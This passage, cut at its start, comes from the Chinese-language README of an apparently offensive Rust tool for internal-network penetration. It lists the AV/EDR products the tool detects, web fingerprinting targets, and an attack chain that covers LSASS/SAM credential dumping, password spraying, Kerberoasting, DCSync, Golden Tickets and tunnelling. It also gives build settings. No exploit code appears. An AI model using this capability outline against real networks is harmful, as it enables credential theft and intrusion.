| 厂商 | 产品 | 类型 |
|------|------|------|
| Microsoft | Defender Antivirus / Defender for Endpoint | AV / EDR |
| CrowdStrike | Falcon | EDR |
| VMware | Carbon Black | EDR |
| SentinelOne | SentinelOne | EDR |
| Palo Alto Networks | Cortex XDR | XDR |
| Trend Micro | Apex One | AV |
| Broadcom | Symantec Endpoint Protection | AV |
| McAfee | Endpoint Security | AV |
| Sophos | Endpoint | AV |
| Kaspersky | Endpoint Security | AV |
| ESET | Endpoint Security | AV |
| Elastic | Security | EDR |
| 奇虎360 | 360安全卫士 | AV |
| 火绒 | 火绒安全 | AV |

---

## Web 指纹识别

内置 33 条指纹规则，覆盖常见内网 Web 应用：

| 类别 | 支持的应用 |
|------|-----------|
| 中间件 | WebLogic, Apache Tomcat, JBoss, WebSphere, Nginx, Apache HTTPD, IIS, OpenResty |
| 管理面板 | 宝塔面板, phpMyAdmin, Adminer |
| OA 系统 | 泛微OA, 致远OA, 蓝凌OA, 通达OA |
| 开发工具 | Jenkins, GitLab, Gitea, SonarQube |
| 基础设施 | Nacos, SkyWalking, Elasticsearch, Harbor, RabbitMQ 管理, Grafana, Prometheus |
| 框架 | Spring Boot, Django Admin, ThinkPHP |
| 协作/监控 | Confluence, Jira, Zabbix |
| 网络设备 | 路由器管理页面 |

---

## 攻击链覆盖

```
侦察发现     scanner（端口扫描/服务探测/Web指纹）+ vuln（漏洞扫描/Web主动探测）
    ↓
信息收集     collector + cred + recon（系统/网络/进程/凭据/环境变量密钥/known_hosts/
             PuTTY/RDP 历史/浏览器/WiFi/应用/GPP/SAM/LSASS/EDR检测/用户猎杀/
             文件共享/AD枚举/BloodHound/防火墙/VLAN/ADCS）
    ↓
权限提升检测 privesc（Windows 7 类 / Linux 8 类自动检测）
    ↓
弱口令打击   cracker（8 服务并发爆破 + 密码喷洒防账户锁定）
    ↓
凭据/票据   cred + ad（Kerberoasting / AS-REP / GPP / DCSync / Golden / Silver Ticket）
    ↓
内网穿透     tunnel（正向/反向/SOCKS5/链式/HTTP/DNS + AEAD 加密 + 目标连接重试）
    ↓
报告输出     output/report（执行摘要/攻击链叙事/发现清单/MITRE ATT&CK/时间线）
```

---

## 技术栈与构建

### 核心技术

- **语言**: Rust 2021 edition
- **异步运行时**: tokio (full features)
- **CLI**: clap 4 (derive)
- **序列化**: serde + serde_json + serde_yaml
- **加密**: XChaCha20-Poly1305 + AES-256-GCM + AES-256-CBC + NTLMv2 (HMAC-MD5) + RC4 + SHA-256
- **LDAP**: ldap3
- **网络**: tokio (TCP/UDP) + reqwest (HTTP/HTTPS) + native-tls
- **数据库**: rusqlite (浏览器密码) + tiberius (MSSQL) + tokio-postgres + mysql_async + redis + mongodb
- **日志**: tracing + tracing-subscriber (env-filter)
- **终端**: indicatif (进度条) + termcolor (颜色) + comfy-table
- **平台**: Windows (winsock/Win32 API/WMI/COM) + Linux (nix/iptables/procfs) + macOS

### 构建配置

Release 构建使用最小体积配置：

```toml
[profile.release]
opt-level = "z"       # 最小体积优化
lto = true            # 链接时优化
strip = true          # 去除符号表
codegen-units = 1     # 单代码生成单元
panic = "abort"       # panic 时直接终止
```

### 构建命令

```bash
cargo build                    # Debug 构建
cargo build --release          # Release 构建（推荐）
cargo test                     # 运行全部测试
cargo test -- --test-threads=1 --nocapture  # 单线程运行测试并显示输出
```

> **Release 构建大小：~6.9 MB**（Windows x86-64，实测）

---

## 版本

v0.4.0

---

## License

Copyright 2024-2026 BlkSword

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
